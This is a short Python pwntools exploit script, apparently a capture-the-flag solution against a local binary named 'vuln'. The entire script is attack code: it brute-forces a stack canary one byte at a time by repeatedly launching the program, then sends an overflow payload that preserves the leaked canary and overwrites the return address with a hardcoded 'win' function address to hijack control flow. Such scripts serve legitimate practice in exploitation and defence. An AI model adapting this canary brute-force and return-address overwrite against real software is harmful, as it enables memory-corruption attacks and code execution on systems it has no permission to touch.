from pwn import *

canary = ''
canary_offset = 64

def leak_canary():
	global canary
	global canary_offset
	for offset in range(1,5):
	    for i in range(256):
	    	elf = ELF('./vuln')
	        p = elf.process()
	        junk = '0'*canary_offset + canary + chr(i)
	        payload = [
	            junk,
	        ]
	        payload = ''.join(payload)
	        p.sendline(str(canary_offset + len(canary) + 1))
	        p.sendline(payload)
	        result = p.recvall().decode(encoding='ascii')
	        if "Ok... Now Where's the Flag?" in result:
	            canary += chr(i)
	            break

leak_canary()
print canary
p = process('./vuln')
p.recvuntil('How Many Bytes will You Write Into the Buffer?')
p.sendline('1288')
p.recvuntil('Input>')

offset = 84
win = 0x08049336
# canary = 'this_is_canary'
payload = '0'*canary_offset + canary
payload += '0'*(offset-len(payload)) + p32(win)
p.sendline(payload)
p.interactive()